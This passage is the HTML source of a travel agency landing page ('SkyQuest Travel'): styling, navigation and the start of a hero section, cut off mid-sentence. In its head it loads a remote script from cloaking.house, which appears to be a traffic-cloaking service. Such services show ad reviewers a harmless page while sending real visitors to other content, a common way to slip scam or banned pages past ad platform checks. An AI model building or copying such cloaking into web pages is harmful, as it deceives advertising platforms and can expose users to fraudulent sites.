<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>SkyQuest Travel — Explore More for Less</title>
  <meta name="description" content="Number one travel agency for cheap flights, budget hotels, and beautiful destinations." />

  <!-- ✅ CLOAKING.HOUSE LABEL SCRIPT -->
  <script src="https://cloaking.house/label/5f44c18fadb99e4bd7cc469890551602.js"></script>

  <style>
    :root {
      --ink: #0b1220; --bg: #0f172a; --muted: #96a0ab;
      --brand: #0ea5e9; --brand2: #22c55e; --accent: #f59e0b;
      --panel: rgba(255,255,255,.06); --line: rgba(255,255,255,.14);
    }
    * { box-sizing: border-box }
    html, body { margin: 0; scroll-behavior: smooth }
    body {
      font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
      background: linear-gradient(180deg, #0b1220, #0b172e);
      color: #e5e7eb;
    }
    a { color: inherit; text-decoration: none }
    .container { max-width: 1180px; margin: 0 auto; padding: 0 18px }

    header.nav {
      position: sticky; top: 0; z-index: 50;
      backdrop-filter: blur(10px);
      background: rgba(10, 16, 30, .55);
      border-bottom: 1px solid var(--line)
    }
    .nav .wrap {
      display: flex; align-items: center; gap: 16px; padding: 14px 18px
    }
    .logo { font-weight: 900; letter-spacing: .3px }
    .logo span { color: #7dd3fc }
    .links { margin-left: auto; display: flex; gap: 8px; flex-wrap: wrap }
    .links a { padding: 8px 12px; border-radius: 10px; font-weight: 600 }
    .links a:hover { background: var(--panel) }
    .cta {
      background: linear-gradient(90deg, var(--brand), var(--brand2));
      color: #032019 !important;
      border-radius: 12px
    }

    .hero {
      position: relative;
      min-height: 72vh;
      display: grid;
      place-items: center;
      text-align: center;
      overflow: hidden;
      border-bottom: 1px solid var(--line)
    }
    .hero::before {
      content: "";
      position: absolute;
      inset: 0;
      background: url("https://images.unsplash.com/photo-1469474968028-56623f02e42e?q=80&w=1900&auto=format&fit=crop") center/cover no-repeat;
      filter: brightness(.65) saturate(1.05);
      z-index: 0
    }
    .hero::after {
      content: "";
      position: absolute;
      inset: 0;
      background: radial-gradient(60% 50% at 20% 10%, rgba(14, 165, 233, .25), transparent 60%),
                  radial-gradient(60% 50% at 80% 10%, rgba(34, 197, 94, .25), transparent 60%);
      mix-blend: screen;
      z-index: 0
    }
    .hero .inner {
      position: relative;
      z-index: 1;
      padding: 64px 18px
    }
    h1 {
      font-size: clamp(30px, 6vw, 60px);
      margin: 0 0 10px;
      color: #fff;
      text-shadow: 0 6px 30px rgba(0, 0, 0, .35)
    }
    .sub {
      max-width: 820px;
      margin: 0 auto 22px;
      color: #d3d7df
    }
    .btn {
      display: inline-block;
      padding: 12px 18px;
      border-radius: 12px;
      font-weight: 800
    }
    .btn.primary {
      background: linear-gradient(90deg, var(--brand), var(--brand2));
      color: #031422;
      box-shadow: 0 10px 28px rgba(14, 165, 233, .25)
    }
    .btn.secondary {
      background: transparent;
      color: #fff;
      border: 1px solid var(--line)
    }

    section { padding: 60px 0; border-top: 1px solid var(--line) }
    .pill {
      display: inline-block;
      font-size: 12px;
      letter-spacing: .3px;
      color: #93c5fd;
      padding: 4px 8px;
      border: 1px solid rgba(59, 130, 246, .35);
      border-radius: 999px
    }
    h2 {
      font-size: clamp(22px, 4.4vw, 36px);
      margin: 12px 0 10px;
      color: #f8fafc
    }
    .lead {
      color: #cbd5e1;
      max-width: 860px
    }

    .cards {
      display: grid;
      grid-template-columns: repeat(12, 1fr);
      gap: 16px;
      margin-top: 14px
    }
    .card {
      grid-column: span 12;
      background: var(--panel);
      border: 1px solid var(--line);
      border-radius: 16px;
      overflow: hidden
    }
    .card .media {
      height: 180px;
      background: #222 center/cover no-repeat
    }
    .card .body { padding: 16px }
    .card h3 { margin: 6px 0 6px; color: #f1f5f9 }
    .card p { margin: 0; color: #cbd5e1 }

    .grid {
      display: grid;
      grid-template-columns: repeat(12, 1fr);
      gap: 12px
    }
    .tile {
      grid-column: span 12;
      height: 240px;
      border-radius: 16px;
      border: 1px solid var(--line);
      background: #222 center/cover no-repeat
    }

    .table {
      width: 100%;
      border-collapse: collapse;
      border: 1px solid var(--line);
      overflow: hidden;
      border-radius: 14px
    }
    .table th, .table td {
      padding: 12px;
      border-bottom: 1px solid var(--line);
      text-align: left
    }
    .table th {
      background: rgba(255,255,255,.06)
    }
    .badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 999px;
      background: #064e3b;
      color: #a7f3d0;
      font-size: 12px
    }

    footer {
      border-top: 1px solid var(--line);
      color: #94a3b8;
      padding: 24px 18px;
      text-align: center
    }

    @media (min-width: 720px) {
      .card { grid-column: span 6 }
    }
    @media (min-width: 1000px) {
      .card { grid-column: span 4 }
      .tile { grid-column: span 4 }
      .tile.w6 { grid-column: span 6 }
    }
  </style>
</head>
<body>

<!-- NAV -->
<header class="nav">
  <div class="container wrap">
    <div class="logo">Sky<span>Quest</span> Travel</div>
    <nav class="links">
      <a href="#home">Home</a>
      <a href="#destinations">Destinations</a>
      <a href="#packages">Packages</a>
      <a href="#hotels">Cheap Hotels</a>
      <a href="#flights">Cheap Flights</a>
      <a href="#booking" class="cta">Book Now</a>
      <a href="#about">About</a>
      <a href="#contact">Contact</a>
    </nav>
  </div>
</header>

<!-- HERO -->
<section class="hero" id="home" role="img" aria-label="Beautiful coastal destination at sunset">
  <div class="inner">
    <h1>Discover Beautiful Places at Friendly Prices</h1>
    <p class="sub">From beach escapes to mountain adventures — unlock exclusive deals on flights, hotels
